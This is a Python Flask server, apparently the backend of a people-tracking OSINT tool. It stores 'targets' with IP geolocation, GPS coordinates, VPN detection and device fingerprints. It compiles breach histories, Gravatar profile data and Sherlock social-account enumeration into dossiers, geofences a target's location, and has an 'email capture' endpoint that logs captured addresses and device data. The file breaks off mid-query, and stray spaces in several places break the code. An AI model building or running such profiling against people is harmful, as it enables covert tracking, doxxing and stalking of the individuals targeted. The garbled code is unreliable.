# server.py - UPDATED WITH ALL FIXES
import os
import time
import sqlite3
import ctypes
import threading
import requests
import random
import re
import hashlib
import json
import dns.resolver
from flask import Flask, jsonify, request
from flask_cors import CORS
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote_plus

# Import our new utility modules
from utils import parse_json_safe, validate_email, validate_username, sanitize_input, format_number, get_user_agent
from hibp_api import HIBPClient, check_breaches_hybrid
from email_validation import EmailValidator
from sherlock_integration import SherlockScanner

# ==================================================================================
# SECTION 1: CONFIGURATION
# ==================================================================================
app = Flask(__name__)
CORS(app)
executor = ThreadPoolExecutor(max_workers=20)
db_lock = threading.Lock()

# HIBP API Key (Optional - get from https://haveibeenpwned.com/API/Key)
# Free tier: 1 request per 1. 5 seconds
# Set to None to use local database only
HIBP_API_KEY = None  # Replace with your API key:  "YOUR_API_KEY_HERE"

# Initialize services
email_validator = EmailValidator()
sherlock_scanner = SherlockScanner(timeout=10, max_workers=15)

# ==================================================================================
# SECTION 2: C++ KERNEL INTEGRATION
# ==================================================================================
if os.name == 'nt':  
    lib_name = "geofence.dll"
else:
    lib_name = "geofence.so"

geo_lib = None

try:
    lib_path = os.path.abspath(lib_name)
    print(f"[KERNEL] Looking for:  {lib_path}")
    
    if os.path.exists(lib_path):
        geo_lib = ctypes.CDLL(lib_path)
        geo_lib.is_inside. argtypes = [ctypes. c_double, ctypes.c_double, ctypes. POINTER(ctypes.c_double), ctypes.POINTER(ctypes.c_double), ctypes.c_int]
        geo_lib.is_inside.restype = ctypes.c_int
        geo_lib.calculate_area.argtypes = [ctypes. POINTER(ctypes.c_double), ctypes.POINTER(ctypes.c_double), ctypes.c_int]
        geo_lib.calculate_area.restype = ctypes.c_double
        geo_lib.calculate_distance.argtypes = [ctypes.c_double, ctypes.c_double, ctypes.c_double, ctypes.c_double]
        geo_lib.calculate_distance.restype = ctypes.c_double
        geo_lib.nearest_fence_distance.argtypes = [ctypes.c_double, ctypes. c_double, ctypes. POINTER(ctypes.c_double), ctypes. POINTER(ctypes.c_double), ctypes.c_int]
        geo_lib.nearest_fence_distance.restype = ctypes.c_double
        print(f"[KERNEL] SUCCESS!  C++ Module '{lib_name}' loaded!")
        print(f"[KERNEL] DSA Algorithms: RAY-CASTING, SHOELACE, HAVERSINE - ACTIVE")
    else:
        print(f"[WARNING] File not found: {lib_path}")
except Exception as e:
    print(f"[ERROR] Failed to load C++ kernel: {e}")
    geo_lib = None

# ==================================================================================
# SECTION 3: DATABASE
# ==================================================================================
def get_db():
    conn = sqlite3.connect('tracking_data.db', timeout=10)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute('''CREATE TABLE IF NOT EXISTS targets (
        id INTEGER PRIMARY KEY, name TEXT UNIQUE, ip TEXT, lat REAL, lon REAL,
        accuracy REAL DEFAULT 0, is_vpn INTEGER DEFAULT 0, is_localhost INTEGER DEFAULT 0,
        vpn_confidence INTEGER DEFAULT 0, vpn_reasons TEXT, real_email TEXT,
        email_valid INTEGER DEFAULT 0, email_provider TEXT, email_mx_servers TEXT,
        breach_count INTEGER DEFAULT 0, breaches TEXT, breach_details TEXT,
        gravatar_url TEXT, gravatar_profile TEXT, linked_accounts TEXT,
        linked_accounts_details TEXT, device_info TEXT, browser TEXT, os TEXT,
        screen_resolution TEXT, timezone TEXT, language TEXT, isp TEXT, city TEXT,
        region TEXT, country TEXT, country_code TEXT, org TEXT, as_number TEXT,
        user_agent TEXT, referrer TEXT, cpu_cores TEXT, gpu_info TEXT,
        touch_support INTEGER DEFAULT 0, cookies_enabled INTEGER DEFAULT 1,
        do_not_track TEXT, platform TEXT, connection_type TEXT, battery_level TEXT,
        osint_log TEXT, status TEXT, last_seen TEXT, created_at TEXT,
        spf_record TEXT, dmarc_record TEXT, spf_policy TEXT, dmarc_policy TEXT,
        spoofing_risk TEXT, disposable_email INTEGER DEFAULT 0
    )''')
    conn.commit()
    conn.close()
    print("[DB] Database initialized")

init_db()

def upgrade_db():
    conn = get_db()
    new_columns = [
        # ...  existing columns ...
        ("security_score", "INTEGER DEFAULT 0"),
        ("security_grade", "TEXT"),
        ("spf_strength", "TEXT"),
        ("dmarc_strength", "TEXT"),
        ("security_strengths", "TEXT"),
        ("security_vulnerabilities", "TEXT"),
        ("security_critical", "TEXT"),
        ("provider_bonus", "INTEGER DEFAULT 0"),  # NEW
        ("is_google_workspace", "INTEGER DEFAULT 0"),  # NEW
        ("is_microsoft_365", "INTEGER DEFAULT 0"),  # NEW
    ]
    for col_name, col_type in new_columns:  
        try:
            conn.execute(f"ALTER TABLE targets ADD COLUMN {col_name} {col_type}")
        except:  
            pass
    conn.commit()
    conn.close()
upgrade_db()

# ==================================================================================
# SECTION 4: VPN DETECTION
# ==================================================================================
DATACENTER_PREFIXES = [
    "3.", "13.", "15.", "18.", "35.", "52.", "54.", "99.", "100.", "34.", "35.",
    "104.", "108.", "142.", "20.", "23.", "40.", "51.", "52.", "65.", "168.", "191.",
    "134.", "137.", "138.", "139.", "146.", "159.", "161.", "162.", "163.", "164.",
    "165.", "167.", "45.", "66.", "78.", "95.", "136.", "140.", "149.", "155.",
    "207.", "208.", "209.", "50.", "69.", "72.", "74.", "96.", "97.", "173.",
    "178.", "198.", "185.", "193.", "194.", "195.", "212.", "217."
]

def is_private_ip(ip):
    if not ip:
        return True
    patterns = [r'^127\.', r'^10\.', r'^172\.(1[6-9]|2[0-9]|3[0-1])\.', r'^192\.168\. ', r'^169\.254\.', r'^0\.', r'^localhost']
    return any(re.match(p, ip, re.IGNORECASE) for p in patterns)

def detect_vpn(ip, headers):
    result = {'is_vpn': False, 'is_localhost': False, 'confidence': 0, 'reasons': []}
    if is_private_ip(ip):
        result['is_localhost'] = True
        result['reasons'].append("Private/Local Network")
        return result
    score = 0
    proxy_headers = {'Via': 20, 'X-Forwarded-For': 10, 'X-Proxy-ID': 30, 'Forwarded': 15, 'X-Real-IP': 5}
    for header, weight in proxy_headers.items():
        value = headers.get(header)
        if value:
            if header == 'X-Forwarded-For' and ',' in value:
                hop_count = len(value.split(','))
                if hop_count > 2:
                    score += weight * 2
                    result['reasons'].append(f"{header} ({hop_count} hops)")
                else:
                    score += weight
                    result['reasons'].append(header)
            else:
                score += weight
                result['reasons'].append(header)
    for prefix in DATACENTER_PREFIXES:
        if ip.startswith(prefix):
            score += 45
            result['reasons'].append(f"Datacenter IP ({prefix}x. x.x)")
            break
    if score >= 35:
        result['is_vpn'] = True
        result['confidence'] = min(score, 100)
    return result

def get_real_ip():
    for header in ['CF-Connecting-IP', 'X-Real-IP', 'X-Forwarded-For']:  
        ip = request.headers.get(header)
        if ip:
            if ',' in ip:
                ip = ip.split(',')[0].strip()
            if ip and not is_private_ip(ip):
                return ip
    return request.remote_addr or "0.0.0.0"

# ==================================================================================
# SECTION 5: IP GEOLOCATION
# ==================================================================================
def get_ip_geolocation(ip):
    result = {'ip': ip, 'city': None, 'region': None, 'country': None, 'country_code': None,
              'isp': None, 'org':  None, 'as_number':  None, 'timezone': None, 'lat': None, 'lon': None}
    if not ip or is_private_ip(ip):
        return result
    try:  
        response = requests.get(f'http://ip-api.com/json/{ip}? fields=66846719', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                result. update({
                    'city': data. get('city'), 'region': data.get('regionName'),
                    'country':  data.get('country'), 'country_code': data.get('countryCode'),
                    'isp': data.get('isp'), 'org': data.get('org'),
                    'as_number': data.get('as'), 'timezone': data.get('timezone'),
                    'lat': data.get('lat'), 'lon': data.get('lon')
                })
    except Exception as e:
        print(f"[IP-GEO ERROR] {e}")
    return result

# ==================================================================================
# SECTION 6: LOCAL BREACH DATABASE (Fallback)
# ==================================================================================
LOCAL_BREACH_DATABASE = {
    "linkedin. com": [
        {"name": "LinkedIn 2012", "date": "2012-05-05", "records": 164611595, "data_types": ["Email", "Password (SHA1)"], "description": "LinkedIn suffered a massive breach where 164M accounts were exposed.  Passwords were SHA1 hashed without salt.", "severity": "CRITICAL", "is_verified": True, "source": "LOCAL_DB"},
        {"name": "LinkedIn 2021 Scrape", "date": "2021-06-22", "records": 700000000, "data_types": ["Email", "Phone", "Name", "Job Title", "Company"], "description": "Data of 700M LinkedIn users was scraped and sold.  Included professional information.", "severity": "HIGH", "is_verified": True, "source":  "LOCAL_DB"}
    ],
    "yahoo.com": [
        {"name": "Yahoo 2013", "date": "2013-08-01", "records": 3000000000, "data_types": ["Email", "Password", "Security Questions", "DOB"], "description": "The largest breach in history. All 3 billion Yahoo accounts were compromised.", "severity": "CRITICAL", "is_verified":  True, "source": "LOCAL_DB"},
        {"name": "Yahoo 2014", "date": "2014-09-01", "records": 500000000, "data_types":  ["Email", "Password (bcrypt)", "Phone", "DOB"], "description": "State-sponsored attack compromising 500M accounts.", "severity": "CRITICAL", "is_verified": True, "source": "LOCAL_DB"}
    ],
    "adobe.com": [
        {"name": "Adobe 2013", "date": "2013-10-04", "records": 153000000, "data_types":  ["Email", "Password (3DES)", "Username", "Password Hint"], "description": "153M Adobe accounts exposed with poorly encrypted passwords and hints.", "severity": "CRITICAL", "is_verified": True, "source": "LOCAL_DB"}
    ],
    "dropbox.com": [
        {"name": "Dropbox 2012", "date": "2012-07-01", "records": 68648009, "data_types": ["Email", "Password (bcrypt/SHA1)"], "description": "68M Dropbox credentials stolen. Half were bcrypt, half SHA1.", "severity": "HIGH", "is_verified": True, "source": "LOCAL_DB"}
    ],
    "myspace.com": [
        {"name": "MySpace 2008", "date": "2008-06-01", "records": 359420698, "data_types": ["Email", "Password (SHA1)", "Username"], "description": "360M MySpace accounts from era before proper security. Unsalted SHA1.", "severity": "HIGH", "is_verified": True, "source":  "LOCAL_DB"}
    ],
    "facebook.com": [
        {"name": "Facebook 2019", "date": "2019-04-01", "records": 533000000, "data_types":  ["Phone", "Name", "DOB", "Location", "Email"], "description": "533M Facebook users' data leaked including phone numbers.", "severity": "CRITICAL", "is_verified": True, "source": "LOCAL_DB"}
    ],
    "twitter.com": [
        {"name": "Twitter 2022", "date": "2022-07-01", "records": 5400000, "data_types": ["Email", "Phone", "Username", "Name"], "description": "5.4M Twitter accounts exposed via API vulnerability.", "severity": "MEDIUM", "is_verified": True, "source": "LOCAL_DB"}
    ],
}

# ==================================================================================
# SECTION 7: GRAVATAR PROFILE EXTRACTION
# ==================================================================================
def get_gravatar_full_profile(email):
    """Get complete Gravatar profile with all available data"""
    result = {'exists': False, 'avatar_url': None, 'profile':  None, 'details': {}}
    
    try:
        email_hash = hashlib.md5(email.lower().strip().encode()).hexdigest()
        
        # Check if avatar exists
        avatar_url = f"https://www.gravatar.com/avatar/{email_hash}? d=404&s=400"
        avatar_response = requests.get(avatar_url, timeout=5)
        
        if avatar_response.status_code == 200:
            result['exists'] = True
            result['avatar_url'] = f"https://www.gravatar.com/avatar/{email_hash}?s=400"
            
            # Try to get JSON profile
            profile_url = f"https://www.gravatar.com/{email_hash}. json"
            try:
                profile_response = requests.get(profile_url, timeout=5)
                if profile_response.status_code == 200:
                    profile_data = profile_response.json()
                    if 'entry' in profile_data and len(profile_data['entry']) > 0:
                        entry = profile_data['entry'][0]
                        result['profile'] = entry
                        result['details'] = {
                            'display_name': entry.get('displayName', ''),
                            'username': entry.get('preferredUsername', ''),
                            'about': entry.get('aboutMe', ''),
                            'location': entry.get('currentLocation', ''),
                            'urls': [url.get('value') for url in entry.get('urls', [])],
                            'accounts': [{
                                'platform': acc.get('shortname', ''),
                                'url': acc.get('url', ''),
                                'username': acc.get('username', ''),
                                'verified': acc.get('verified', False)
                            } for acc in entry.get('accounts', [])],
                            'photos': [photo.get('value') for photo in entry.get('photos', [])],
                            'emails': [e.get('value') for e in entry.get('emails', [])],
                            'name': entry.get('name', {}),
                            'profile_url': entry.get('profileUrl', '')
                        }
            except:  
                pass
                
    except Exception as e:  
        print(f"[GRAVATAR ERROR] {e}")
    
    return result

# ==================================================================================
# SECTION 8: OSINT SCANNER ENGINES (UPDATED)
# ==================================================================================
def write_log(name, log, status="SCANNED"):
    with db_lock:
        conn = get_db()
        conn.execute("UPDATE targets SET osint_log=?, status=?, last_seen=? WHERE name=?", (log, status, time.ctime(), name))
        conn.commit()
        conn.close()

def scan_email(target):
    """Comprehensive email forensics with HIBP integration"""
    log = "=" * 70 + "\n"
    log += "  EMAIL FORENSICS REPORT - DEEP ANALYSIS\n"
    log += f"  Target: {target}\n"
    log += f"  Scan Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n"
    log += "=" * 70 + "\n\n"
    
    if not validate_email(target):
        log += "[ERROR] Invalid email format\n"
        write_log(target, log, "INVALID")
        return
    
    domain = target.split('@')[1]
    username = target.split('@')[0]
    
    log += f"[SECTION 1] EMAIL PARSING\n"
    log += "-" * 50 + "\n"
    log += f"  Username: {username}\n"
    log += f"  Domain: {domain}\n"
    log += f"  Hash (MD5): {hashlib.md5(target.lower().encode()).hexdigest()}\n"
    log += f"  Hash (SHA256): {hashlib.sha256(target.lower().encode()).hexdigest()[:32]}...\n\n"
    
    # Advanced Email Validation
    log += f"[SECTION 2] ADVANCED EMAIL VALIDATION\n"
    log += "-" * 50 + "\n"
    validation_result = email_validator.validate_comprehensive(target)
    
    log += f"  Format Valid: {'✓' if validation_result['format_valid'] else '✗'}\n"
    log += f"  Domain Exists: {'✓' if validation_result['domain_exists'] else '✗'}\n"
    log += f"  MX Valid: {'✓' if validation_result['mx_valid'] else '✗'}\n"
    log += f"  Disposable Email: {'⚠️ YES' if validation_result['disposable'] else '✓ No'}\n"
    log += f"  Provider:  {validation_result['provider']}\n"
    log += f"  Email Type: {validation_result['provider_details']. get('type', 'unknown').upper()}\n\n"
    
    if validation_result['mx_records']:
        log += f"  Mail Servers ({len(validation_result['mx_records'])}):\n"
        for mx in validation_result['mx_records'][:5]: 
            log += f"    [{mx['priority']}] {mx['server']}\n"
        log += "\n"
    
    # SPF/DKIM/DMARC Analysis
    log += f"[SECTION 3] EMAIL SECURITY HEADERS (SPOOFING ANALYSIS)\n"
    log += "-" * 50 + "\n"
    
    if validation_result['spf_record']:
        log += f"  SPF Record:  FOUND\n"
        log += f"  SPF Policy: {validation_result['spf_policy']}\n"
        log += f"  Raw:  {validation_result['spf_record'][: 80]}...\n\n"
    else:
        log += f"  SPF Record: ⚠️ NOT FOUND (email can be easily spoofed)\n\n"
    
    if validation_result['dmarc_record']:
        log += f"  DMARC Record: FOUND\n"
        log += f"  DMARC Policy: {validation_result['dmarc_policy']}\n"
        log += f"  Raw: {validation_result['dmarc_record'][:80]}...\n\n"
    else:
        log += f"  DMARC Record: ⚠️ NOT FOUND (no sender verification)\n\n"
    
    log += f"  ⚡ SPOOFING RISK LEVEL: {validation_result['spoofing_risk']}\n"
    
    if validation_result['spoofing_risk'] in ['CRITICAL', 'HIGH']:
        log += f"  ⚠️  WARNING: This email can be easily spoofed by attackers!\n"
    log += "\n"
    
    # Breach Analysis with HIBP
    log += f"[SECTION 4] DATA BREACH ANALYSIS (HIBP + LOCAL DB)\n"
    log += "-" * 50 + "\n"
    
    breach_result = check_breaches_hybrid(target, LOCAL_BREACH_DATABASE, HIBP_API_KEY)
    
    log += f"  Data Source: {breach_result['source']}\n"
    
    if breach_result['breached']:
        log += f"  ⚠️ ALERT: EMAIL FOUND IN {breach_result['total_breaches']} BREACH(ES)\n"
        log += f"  Total Records Exposed: {format_number(breach_result['total_records_exposed'])}\n"
        log += f"  Risk Level: {breach_result['risk_level']}\n"
        log += f"  Verified Breaches: {breach_result['verified_breaches']}\n\n"
        
        log += "  BREACH DETAILS:\n"
        for breach in breach_result['breaches'][:10]:  # Show top 10
            if not breach. get('is_spam_list', False):
                log += f"\n  ┌─ {breach. get('name', 'Unknown')}\n"
                log += f"  │  Date: {breach.get('date', 'N/A')}\n"
                log += f"  │  Records: {format_number(breach.get('records', 0))}\n"
                log += f"  │  Severity: {breach.get('severity', 'UNKNOWN')}\n"
                log += f"  │  Data Types: {', '.join(breach.get('data_types', []))}\n"
                desc = breach.get('description', '')
                if desc:
                    log += f"  │  Description: {desc[:100]}.. .\n"
                log += f"  │  Verified: {'✓' if breach. get('is_verified', True) else '?'}\n"
                log += f"  │  Source: {breach.get('source', 'UNKNOWN')}\n"
                log += f"  └─\n"
        
        if breach_result['data_types_exposed']:
            log += f"\n  DATA TYPES EXPOSED:\n"
            for dtype in breach_result['data_types_exposed']:
                log += f"    • {dtype}\n"
        
        if breach_result['recommendations']:
            log += f"\n  🔐 SECURITY RECOMMENDATIONS:\n"
            for rec in breach_result['recommendations']: 
                log += f"    ⚡ {rec}\n"
    else:
        log += "  ✓ No known breaches found for this email\n"
        log += "  Note: This doesn't guarantee safety - check regularly!\n"
    
    log += "\n"
    
    # Gravatar Intelligence
    log += f"[SECTION 5] GRAVATAR INTELLIGENCE\n"
    log += "-" * 50 + "\n"
    gravatar_result = get_gravatar_full_profile(target)
    
    if gravatar_result['exists']: 
        log += f"  Gravatar:  FOUND\n"
        log += f"  Avatar URL: {gravatar_result['avatar_url']}\n"
        
        if gravatar_result['details']:
            details = gravatar_result['details']
            if details.get('display_name'):
                log += f"  Display Name: {details['display_name']}\n"
            if details.get('location'):
                log += f"  Location: {details['location']}\n"
            if details.get('about'):
                log += f"  About: {details['about'][: 150]}...\n"
            if details.get('accounts'):
                log += f"  Linked Accounts ({len(details['accounts'])}):\n"
                for acc in details['accounts']: 
                    verified_icon = "✓" if acc. get('verified') else ""
                    log += f"    • {acc['platform']}: {acc['url']} {verified_icon}\n"
    else:
        log += "  Gravatar: Not found\n"
        log += "  (Most users don't have Gravatar profiles)\n"
    
    log += "\n"
    
    # Social Media Enumeration with Sherlock
    log += f"[SECTION 6] SOCIAL MEDIA ENUMERATION (SHERLOCK)\n"
    log += "-" * 50 + "\n"
    log += f"  Scanning username '{username}' across 50+ platforms...\n\n"
    
    social_results = sherlock_scanner.scan_username(username)
    
    found_accounts = [r for r in social_results if r['exists'] is True]
    not_found = [r for r in social_results if r['exists'] is False]
    manual_check = [r for r in social_results if r['exists'] is None and r['status'] == 'MANUAL']
    uncertain = [r for r in social_results if r['exists'] is None and r['status'] not in ['MANUAL', 'TIMEOUT', 'CONNECTION ERROR']]
    
    log += f"  ✓ FOUND:  {len(found_accounts)} profiles\n"
    log += f"  ✗ NOT FOUND: {len(not_found)} profiles\n"
    log += f"  ?  MANUAL CHECK REQUIRED: {len(manual_check)} profiles\n"
    log += f"  ⚠ UNCERTAIN/ERROR: {len(uncertain)} profiles\n\n"
    
    if found_accounts:
        log += "  VERIFIED PROFILES FOUND:\n"
        for acc in found_accounts:
            log += f"\n  ┌─ {acc['platform']} [VERIFIED]\n"
            log += f"  │  URL: {acc['url']}\n"
            if acc.get('details'):
                for key, value in acc['details'].items():
                    if value and key not in ['profile_url', 'avatar'] and value != 'None':
                        log += f"  │  {key. replace('_', ' ').title()}: {str(value)[:60]}\n"
            log += f"  └─\n"
    
    if manual_check:
        log += f"\n  MANUAL VERIFICATION NEEDED (Anti-bot protection):\n"
        for acc in manual_check:
            log += f"    • {acc['platform']}:  {acc['url']}\n"
    
    log += "\n" + "=" * 70 + "\n"
    log += f"[SUMMARY]\n"
    log += f"  Email Valid: {'YES' if validation_result['valid'] else 'NO'}\n"
    log += f"  Provider: {validation_result['provider']}\n"
    log += f"  Disposable: {'⚠️ YES' if validation_result['disposable'] else 'No'}\n"
    log += f"  Spoofing Risk: {validation_result['spoofing_risk']}\n"
    log += f"  Breach Status: {'⚠️ COMPROMISED' if breach_result['breached'] else '✓ CLEAN'}\n"
    log += f"  Risk Level: {breach_result['risk_level']}\n"
    log += f"  Social Profiles Found: {len(found_accounts)}\n"
    log += f"  Gravatar:  {'✓ Found' if gravatar_result['exists'] else 'Not found'}\n"
    log += "=" * 70 + "\n"
    
    # Update database with all findings
    with db_lock:
        conn = get_db()
        conn.execute("""
            UPDATE targets SET 
                email_valid=?, email_provider=?, email_mx_servers=?,
                breach_count=?, breaches=?, breach_details=?,
                gravatar_url=?, gravatar_profile=?,
                linked_accounts=?, linked_accounts_details=?,
                spf_record=?, dmarc_record=?, spf_policy=?, dmarc_policy=?,
                spoofing_risk=?, disposable_email=?,
                osint_log=?, status=?, last_seen=?
            WHERE name=?
        """, (
            1 if validation_result['valid'] else 0,
            validation_result['provider'],
            json.dumps(validation_result['mx_records']),
            breach_result['total_breaches'],
            ', '.join([b. get('name', 'Unknown') for b in breach_result['breaches'][: 10]]),
            json.dumps(breach_result['breaches']),
            gravatar_result. get('avatar_url'),
            json.dumps(gravatar_result. get('details', {})),
            ', '.join([a['platform'] for a in found_accounts]),
            json.dumps(social_results),
            validation_result. get('spf_record'),
            validation_result.get('dmarc_record'),
            validation_result.get('spf_policy'),
            validation_result.get('dmarc_policy'),
            validation_result.get('spoofing_risk'),
            1 if validation_result['disposable'] else 0,
            log,
            f"SCANNED:{len(found_accounts)}FOUND:{breach_result['risk_level']}",
            time.ctime(),
            target
        ))
        conn.commit()
        conn.close()

def scan_social(target):
    """Comprehensive social media scan with Sherlock"""
    log = "=" * 70 + "\n"
    log += "  SOCIAL GRAPH INTELLIGENCE REPORT\n"
    log += f"  Target Username: {target}\n"
    log += f"  Scan Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n"
    log += "=" * 70 + "\n\n"
    
    if not validate_username(target):
        log += "[ERROR] Invalid username format (use alphanumeric, _, - only)\n"
        write_log(target, log, "INVALID")
        return
    
    log += f"[*] Initiating deep scan across 50+ platforms with Sherlock engine...\n\n"
    
    results = sherlock_scanner.scan_username(target)
    
    found = [r for r in results if r['exists'] is True]
    not_found = [r for r in results if r['exists'] is False]
    manual = [r for r in results if r['exists'] is None and r['status'] == 'MANUAL']
    errors = [r for r in results if r['exists'] is None and r['status'] not in ['MANUAL']]
    
    log += "-" * 70 + "\n"
    log += f"{'PLATFORM':<20} {'STATUS':<15} {'DETAILS'}\n"
    log += "-" * 70 + "\n"
    
    # Show found profiles first
    for r in found:
        log += f"[+] {r['platform']:<18} {'✓ FOUND':<15}\n"
        log += f"    URL: {r. get('url', 'N/A')}\n"
        if r.get('details'):
            for key, value in r['details'].items():
                if value and key not in ['profile_url', 'avatar'] and str(value) != 'None':
                    if isinstance(value, (list, dict)):
                        log += f"    {key.replace('_', ' ').title()}: {json.dumps(value)[:80]}\n"
                    else:
                        log += f"    {key.replace('_', ' ').title()}: {str(value)[:60]}\n"
        log += "\n"
    
    # Show manual check platforms
    if manual:
        log += "\n  MANUAL VERIFICATION REQUIRED:\n"
        log += "  (These platforms block automated checks)\n\n"
        for r in manual:
            log += f"[? ] {r['platform']:<18} {'MANUAL CHECK':<15}\n"
            log += f"    URL: {r.get('url', 'N/A')}\n"
            if r. get('note'):
                log += f"    Note: {r['note']}\n"
            log += "\n"
    
    # Compact view for not found
    if not_found: 
        log += f"\n  NOT FOUND ON:  {', '.join([r['platform'] for r in not_found[: 20]])}\n"
        if len(not_found) > 20:
            log += f"  ... and {len(not_found) - 20} more\n"
    
    log += "\n" + "-" * 70 + "\n\n"
    
    log += "[SUMMARY]\n"
    log += f"  Profiles Found: {len(found)}/{len(results)}\n"
    log += f"  Not Found: {len(not_found)}/{len(results)}\n"
    log += f"  Manual Check Required: {len(manual)}/{len(results)}\n"
    log += f"  Errors/Timeouts: {len(errors)}/{len(results)}\n"
    log += f"  Scan Coverage: {((len(results) - len(errors)) / len(results)) * 100:.1f}%\n\n"
    
    log += "[RISK ASSESSMENT]\n"
    if len(found) >= 15:
        risk = "VERY HIGH"
        desc = "Extensive digital footprint.  Target is highly active online."
    elif len(found) >= 10:
        risk = "HIGH"
        desc = "Significant online presence across multiple platforms."
    elif len(found) >= 5:
        risk = "MODERATE"
        desc = "Notable online presence on several platforms."
    elif len(found) >= 2:
        risk = "LOW"
        desc = "Limited online presence detected."
    else:
        risk = "MINIMAL"
        desc = "Very limited or no public online presence."
    
    log += f"  Risk Level: {risk}\n"
    log += f"  Analysis: {desc}\n\n"
    
    if found: 
        log += "[FOUND PROFILES - DIRECT LINKS]\n"
        for acc in found:
            log += f"  • {acc['platform']}: {acc. get('url', 'N/A')}\n"
    
    log += "\n" + "=" * 70 + "\n"
    log += "  END OF REPORT\n"
    log += "=" * 70 + "\n"
    
    # Update database
    with db_lock:
        conn = get_db()
        conn.execute("""
            UPDATE targets SET 
                linked_accounts=?, linked_accounts_details=?,
                osint_log=?, status=?, last_seen=?
            WHERE name=?
        """, (
            ', '.join([a['platform'] for a in found]),
            json.dumps(results),
            log,
            f"FOUND:{len(found)}",
            time.ctime(),
            target
        ))
        conn.commit()
        conn.close()

# ==================================================================================
# SECTION 9: API ROUTES
# ==================================================================================
@app.route('/api/targets', methods=['GET'])
def get_targets():
    conn = get_db()
    rows = conn.execute("SELECT * FROM targets ORDER BY id DESC").fetchall()
    conn.close()
    return jsonify([dict(r) for r in rows])

@app.route('/api/scan', methods=['POST'])
def start_scan():
    data = request.json
    query = sanitize_input(data.get('query', ''), max_length=100)
    mode = data.get('mode', 'SOCIAL')
    
    if not query:
        return jsonify({"error": "Empty query"}), 400
    
    # Validate input based on mode
    if mode == 'EMAIL' and not validate_email(query):
        return jsonify({"error": "Invalid email format"}), 400
    elif mode == 'SOCIAL' and not validate_username(query):
        return jsonify({"error":  "Invalid username format (alphanumeric, _, - only)"}), 400
    
    with db_lock:
        conn = get_db()
        try:
            conn.execute("INSERT INTO targets (name, status, osint_log, last_seen, created_at) VALUES (?, ?, ?, ?, ?)",
                         (query, "SCANNING", "Initializing deep scan.. .", time.ctime(), time.ctime()))
        except sqlite3.IntegrityError:
            conn.execute("UPDATE targets SET status=?, osint_log=?, last_seen=? WHERE name=? ",
                         ("RE-SCANNING", "Re-scanning target...", time.ctime(), query))
        conn.commit()
        conn.close()
    
    if mode == 'EMAIL':
        executor. submit(scan_email, query)
    else:
        executor.submit(scan_social, query)
    
    return jsonify({"status":  "Started", "target": query, "mode": mode})

@app.route('/api/geofence_calc', methods=['POST'])
def calc_geofence():
    try:
        data = request.json
        if not geo_lib:  
            return jsonify({"error": "C++ kernel not loaded", "inside": False, "area_sq_m": 0, "nearest_fence_m": 0})
        
        polygon = data.get('polygon', [])
        if len(polygon) < 3:
            return jsonify({"error": "Need at least 3 points", "inside": False, "area_sq_m": 0, "nearest_fence_m": 0})
        
        user_lat, user_lon = float(data.get('lat', 0)), float(data.get('lon', 0))
        if user_lat == 0 and user_lon == 0:
            return jsonify({"error":  "Target has no GPS coordinates", "inside": False, "area_sq_m": 0, "nearest_fence_m": 0})
        
        count = len(polygon)
        ArrayType = ctypes.c_double * count
        lats = ArrayType(*[float(p[0]) for p in polygon])
        lons = ArrayType(*[float(p[1]) for p in polygon])
        
        inside = geo_lib.is_inside(user_lat, user_lon, lats, lons, count)
        area = geo_lib.calculate_area(lats, lons, count)
        dist = geo_lib.nearest_fence_distance(user_lat, user_lon, lats, lons, count)
        
        return jsonify({"inside": bool(inside), "area_sq_m": round(area, 2), "nearest_fence_m": round(dist, 2)})
    except Exception as e:
        return jsonify({"error": str(e), "inside": False, "area_sq_m": 0, "nearest_fence_m": 0})

@app.route('/api/distance', methods=['POST'])
def calc_distance():
    data = request.json
    if not geo_lib: 
        return jsonify({"error": "C++ kernel not loaded"}), 500
    lat1, lon1 = float(data.get('lat1', 0)), float(data.get('lon1', 0))
    lat2, lon2 = float(data.get('lat2', 0)), float(data.get('lon2', 0))
    distance = geo_lib.calculate_distance(lat1, lon1, lat2, lon2)
    return jsonify({"distance_m": round(distance, 2), "distance_km": round(distance / 1000, 3)})

@app.route('/api/check_email', methods=['POST'])
def api_check_email():
    """Standalone email checker API endpoint"""
    data = request.json
    email = sanitize_input(data.get('email', ''), max_length=100).lower()
    
    if not validate_email(email):
        return jsonify({'error': 'Invalid email format'}), 400
    
    # Run all checks
    validation_result = email_validator.validate_comprehensive(email)
    breach_result = check_breaches_hybrid(email, LOCAL_BREACH_DATABASE, HIBP_API_KEY)
    gravatar_result = get_gravatar_full_profile(email)
    
    username = email.split('@')[0]
    social_results = sherlock_scanner.scan_username(username)
    
    return jsonify({
        'email':  email,
        'validation':  validation_result,
        'breaches': breach_result,
        'gravatar': gravatar_result,
        'social_accounts': social_results,
        'timestamp': time.time()
    })

@app.route('/api/ip_lookup', methods=['POST'])
def ip_lookup():
    data = request.json
    ip = sanitize_input(data.get('ip', ''), max_length=45) or get_real_ip()
    geo_data = get_ip_geolocation(ip)
    vpn_data = detect_vpn(ip, request.headers)
    return jsonify({'ip': ip, 'geolocation': geo_data, 'vpn_check': vpn_data})

# ==================================================================================
# SECTION 10: EMAIL CAPTURE API
# ==================================================================================
@app.route('/api/report_email', methods=['POST'])
def report_email():
    data = request.json
    name = sanitize_input(data.get('name', ''), max_length=50)
    email = sanitize_input(data.get('email', ''), max_length=100).lower()
    device_info = data.get('device_info', {})
    
    print(f"[EMAIL CAPTURED] Target: {name} | Email: {email}")
    
    if not validate_email(email):
        return jsonify({'error': 'Invalid email format', 'valid': False}), 400
    
    # Run comprehensive checks
    validation_result = email_validator.validate_comprehensive(email)
    breach_result = check_breaches_hybrid(email, LOCAL_BREACH_DATABASE, HIBP_API_KEY)
    gravatar_result = get_gravatar_full_profile(email)
    
    username = email.split('@')[0]
    social_results = sherlock_scanner.scan_username(username)
    found_accounts = [a for a in social_results if a.  get('exists') is True]
    
    # Extract detailed security info
       # Extract detailed security info
    spf_details = validation_result.get('spf_details', {})
    dmarc_details = validation_result.get('dmarc_details', {})
    spoofing_details = validation_result.get('spoofing_details', {})
    
    with db_lock:
        conn = get_db()
        conn.execute("""
            UPDATE targets SET 
                real_email=?, email_valid=?, email_provider=?, email_mx_servers=?,
                breach_count=?, breaches=?, breach_details=?,
                gravatar_url=?, gravatar_profile=?,
